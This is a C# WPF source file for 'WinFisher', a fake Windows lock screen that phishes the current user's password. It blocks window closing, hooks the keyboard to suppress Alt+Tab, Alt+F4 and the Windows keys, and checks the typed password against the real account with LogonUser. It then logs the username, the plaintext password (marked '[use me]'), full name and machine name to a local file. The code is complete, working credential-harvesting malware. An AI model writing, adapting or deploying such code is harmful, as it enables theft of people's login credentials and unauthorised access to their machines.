using System;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Windows;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Threading;

namespace WinFisher
{
    public partial class MainWindow : Window
    {

    #if DEBUG
        bool DevEnv = true;
    #else
        bool DevEnv = false;
    #endif

        const int failedLimit = 2;

        int failed = 0;


        bool isCloseable = true;

        private DispatcherTimer timer;

        public MainWindow()
        {
            InitializeComponent();
            Loaded += MainWindow_Loaded;
            Closing += MainWindow_Closing;
        }

        // Winodw Closing Handling
        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            // Prevents the window from closing if isCloseable is false
            if (!isCloseable) e.Cancel = true;
            else UnhookWindowsHookEx(hHook); // release keyboard hook
        }

        ///////////////////////////////////////////////////
        //////////LAYOUT ARRANGMENT and FILLING////////////
        ///////////////////////////////////////////////////
        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            // if the application is not being run in a development environment than
            // ----------sets the window to be topmost
            // ----------prevent window from closing
            // ----------disable window hotkeys
            if (!DevEnv)
            {
                Topmost = true;
                isCloseable = false;
                disableHotKeys();
            }

            // Set margin of StackPanel that contains date/time according to screen width/height
            // Adjusts the margin of the StackPanel to dynamically position it based on the window size
            stkpnl_datetime.Margin = new Thickness(this.Width * 0.023, 0, 0, this.ActualHeight * 0.095);

            // Set font size of time and date
            // Adjusts the font size of time and date text blocks based on the window width
            txtblk_time.FontSize = this.Width * 0.09;
            txtblk_date.FontSize = txtblk_time.FontSize - 70;

            // Reduce height of time block
            // Adjusts the height of the time text block
            txtblk_time.Height = txtblk_time.ActualHeight - txtblk_time.ActualHeight * 0.06;

            // Set size of image
            // Adjusts the size of the user image based on the window height
            image_userImage.Width = this.ActualHeight * 0.22;
            image_userImage.Height = this.ActualHeight * 0.22;
            image_userImage.CornerRadius = new CornerRadius(this.ActualHeight / 2);

            // Set user name
            // Retrieves and sets the user's full name
            txtblk_userName.Text = GetFullName();

            // Set size of main user name
            // Adjusts the font size of the main user name based on the window width
            txtblk_userName.FontSize = txtblk_time.FontSize - 80;

            // Set color of list
            // Sets the background color of the user information stack panel
            stkpnl_user.Background = new SolidColorBrush(Color.FromArgb(255, 0, 90, 158));

            // Fill UserName
            // Sets the user name text blocks to the user's full name in uppercase
            txtblk_userName.Text = GetFullName().ToUpper();
            txtblk_userNameS.Text = GetFullName().ToUpper();

            // Set current date and time
            // Updates the date and time text blocks with the current date and time
            DateTime now = DateTime.Now;
            string formattedDate = now.ToString("dddd, dd MMMM");
            txtblk_date.Text = formattedDate;
            txtblk_time.Text = DateTime.Now.ToString("hh:mm");

            // Create a new DispatcherTimer object for updating time every minute
            timer = new DispatcherTimer();
            // Set the interval to 1 minute (60 sec)
            timer.Interval = TimeSpan.FromSeconds(60);
            // Attach an event handler to the Tick event to update time
            timer.Tick += (sndr, evnt) =>
            {
                txtblk_time.Text = DateTime.Now.ToString("hh:mm");
            };
            // Start the timer
            timer.Start();


            // Set default Windows 10 background (not implemented)
            //image_bg.Source = new BitmapImage(new Uri (@"C:\Windows\Web\Screen\img100.jpg"));
        }

        ///////////////////////////////////////////////////
        //////////ANIMATE ON CLICK or KEYDOWN/////////////
        ///////////////////////////////////////////////////

        /////////////EVENTS///////////////////
        private void Grid_KeyDown(object sender, KeyEventArgs e)
        {
            // Triggers animation when a key is pressed
            AnimateDateTimeandBG();
        }

        private void Grid_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            // Triggers animation when the mouse is clicked
            AnimateDateTimeandBG();
        }


        /////////////ANIMATION///////////////////
        private void AnimateDateTimeandBG()
        {
            // Create animations for elements
            // Animates the opacity, translation, and blur radius of elements
            DoubleAnimation opacityAnimation = new DoubleAnimation(0, new Duration(TimeSpan.FromSeconds(0.3)));
            DoubleAnimation translateYAnimation = new DoubleAnimation(-300, new Duration(TimeSpan.FromSeconds(0.3)));
            DoubleAnimation blurAnimation = new DoubleAnimation(50, new Duration(TimeSpan.FromSeconds(0.3)));

            // Create a storyboard to contain the animations
            Storyboard storyboard = new Storyboard();
            storyboard.Children.Add(opacityAnimation);
            storyboard.Children.Add(translateYAnimation);
            storyboard.Children.Add(blurAnimation);

            // Set the targets of the animations
            Storyboard.SetTarget(opacityAnimation, stkpnl_datetime);
            Storyboard.SetTargetProperty(opacityAnimation, new PropertyPath(UIElement.OpacityProperty));
            Storyboard.SetTarget(translateYAnimation, stkpnl_datetime);
            Storyboard.SetTargetProperty(translateYAnimation, new PropertyPath("(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.Y)"));
            Storyboard.SetTarget(blurAnimation, image_bg);
            Storyboard.SetTargetProperty(blurAnimation, new PropertyPath("(UIElement.Effect).(BlurEffect.Radius)"));

            // Begin the animation
            storyboard.Completed += AnimateUserNameandIcon; // Attach a completion event handler
            storyboard.Begin();
        }

        private void AnimateUserNameandIcon(object sender, EventArgs e)
        {
            // Show profile elements and hide datetime elements
            stkpnl_profileCenter.Visibility = Visibility.Visible;
            stkpnl_usersList.Visibility = Visibility.Visible;
            image_accessibility.Visibility = Visibility.Visible;
            image_internet.Visibility = Visibility.Visible;
            stkpnl_datetime.Visibility = Visibility.Collapsed;
            pswrdBx_password.Focus();

            // Create animations for profile elements
            DoubleAnimation opacityAnim1 = new DoubleAnimation(1, new Duration(TimeSpan.FromSeconds(0.2)));
            DoubleAnimation opacityAnim2 = new DoubleAnimation(1, new Duration(TimeSpan.FromSeconds(0.2)));

            // Create a storyboard to contain the animations
            Storyboard storyboard = new Storyboard();
            storyboard.Children.Add(opacityAnim1);
            storyboard.Children.Add(opacityAnim2);

            // Set the targets of the animations
            Storyboard.SetTarget(opacityAnim1, stkpnl_usersList);
            Storyboard.SetTargetProperty(opacityAnim1, new PropertyPath(UIElement.OpacityProperty));
            Storyboard.SetTarget(opacityAnim2, stkpnl_profileCenter);
            Storyboard.SetTargetProperty(opacityAnim2, new PropertyPath(UIElement.OpacityProperty));

            // Begin the animation
            storyboard.Begin();
        }



        ///////////////////////////////////////////////////
        //////////VALIDATE CREDENTIALS/////////////////////
        ///////////////////////////////////////////////////

        /////////////EVENTS///////////////////
        private void image_submitIcon_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            // Trigger authentication when submit icon is clicked
            AuthenticateUser();
        }

        private void pswrdBx_password_KeyDown(object sender, KeyEventArgs e)
        {
            // Hide error message and authenticate user when Enter key is pressed
            txtblk_error.Visibility = Visibility.Hidden;
            if (e.Key == Key.Enter) AuthenticateUser();
        }

        /////////////LOGIC///////////////////
        private void AuthenticateUser()
        {
            // Authenticate user with entered password
            string userPassword = pswrdBx_password.Password;
            if (isCredsValid(userPassword))
            {
                // On successful authentication
                WriteFile(userPassword, true); // Log successful authentication
                isCloseable = true; // Allow window to close
                Close(); // Close the window
            }
            else
            {
                // On failed authentication
                WriteFile(userPassword, false); // Log failed authentication
                failed++; // Increment failed attempts counter
                if (failed >= failedLimit) // If maximum failed attempts reached
                {
                    isCloseable = true; // Allow window to close
                    Close(); // Close the window
                    return;
                }
                txtblk_error.Visibility = Visibility.Visible; // Show error message
                pswrdBx_password.SelectAll(); // Select all text in password box for easier retry
            }
        }



        ///////////////////////////////////////////////////
        ///////////////////Helper Functions////////////////
        ///////////////////////////////////////////////////

        // Get the full name of the current user
        private string GetFullName()
        {
            Process process = new Process();


            // string command = "/C net user /domain "; // For AD environment
            string command = "/C net user "; // For normal scenario


            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = command + Environment.UserName,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            foreach (string line in output.Split('\n'))
            {
                if (line.Contains("Full Name"))
                {
                    return line.Substring(line.IndexOf("Full Name") + "Full Name".Length).Trim();
                }
            }
            return "";
        }


        // Write authentication log to a file
        public void WriteFile(string password, bool success)
        {
            // MAKE CUSTOM WRITE LOGIC HERE

            // File path for logging
            string fileName = DateTime.Now.ToString("ddMMyyyy");
            string fullPath = "./" + fileName;

            string textToWrite = "\n\n------------------\n"; // Spacing at start
            textToWrite += "Type : " + (success ? "Success" : "Fail") + "\n"; // Log authentication result
            textToWrite += "Time : " + DateTime.Now.ToString("hh::mm | dd::MM::yyyy") + "\n"; // Log date and time
            textToWrite += "[use me] User Name : " + Environment.UserName + "\n"; // Log username
            textToWrite += "[use me] User Password : " + password + "\n"; // Log password
            textToWrite += "User Full Name : " + GetFullName() + "\n"; // Log user's full name
            textToWrite += "Machine Name : " + Environment.MachineName; // Log machine name
            textToWrite += "\n------------------\n\n"; // Spacing at end

            // Append log to file
            File.AppendAllText(fullPath, textToWrite);
        }


        ///////////////////////////////////////////////////
        //////////IMPORT WINDOW DLL TO VALIDATE CREDS//////
        ///////////////////////////////////////////////////
        

        // src : ChatGPT
        
        
        
        // P/Invoke declarations for validating credentials
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool LogonUser(
            string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            out IntPtr phToken
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const int LOGON32_LOGON_INTERACTIVE = 2;
        private const int LOGON32_PROVIDER_DEFAULT = 0;

        // Validate user credentials
        private bool isCredsValid(string password)
        {
            IntPtr tokenHandle;
            if (LogonUser(Environment.UserName, null, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, out tokenHandle))
            {
                CloseHandle(tokenHandle);
                return true; // Return true if credentials are valid
            }
            else return false; // Return false if credentials are invalid
        }

        ///////////////////////////////////////////////////
        //////////DISABLING WINDOWS SHORTCUT KEYS//////////
        ///////////////////////////////////////////////////


        // src : https://learn.microsoft.com/en-us/archive/msdn-technet-forums/abca8dad-b103-436d-aad3-48443e4b95b5

        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            int scanCode;
            public int flags;
            int time;
            int dwExtraInfo;
        }

        private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hHook);

        [DllImport("user32.dll")]
        private static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(IntPtr path);

        private IntPtr hHook;
        LowLevelKeyboardProcDelegate hookProc; // prevent gc
        const int WH_KEYBOARD_LL = 13;


        void disableHotKeys()
        {
            // hook keyboard
            IntPtr hModule = GetModuleHandle(IntPtr.Zero);
            hookProc = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc);
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hModule, 0);
            if (hHook == IntPtr.Zero)
            {
                MessageBox.Show("Failed to set hook, error = " + Marshal.GetLastWin32Error());
            }
        }
        private static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            if (nCode >= 0)
                switch (wParam)
                {
                    case 256: // WM_KEYDOWN
                    case 257: // WM_KEYUP
                    case 260: // WM_SYSKEYDOWN
                    case 261: // M_SYSKEYUP
                        if (
                            (lParam.vkCode == 0x09 && lParam.flags == 32) || // Alt+Tab
                            (lParam.vkCode == 0x1b && lParam.flags == 32) || // Alt+Esc
                            (lParam.vkCode == 0x73 && lParam.flags == 32) || // Alt+F4
                            (lParam.vkCode == 0x1b && lParam.flags == 0) || // Ctrl+Esc
                            (lParam.vkCode == 0x5b && lParam.flags == 1) || // Left Windows Key 
                            (lParam.vkCode == 0x5c && lParam.flags == 1))    // Right Windows Key 
                        {
                            return 1; //Do not handle key events
                        }
                        break;
                }
            return CallNextHookEx(0, nCode, wParam, ref lParam);
        }
    }
}
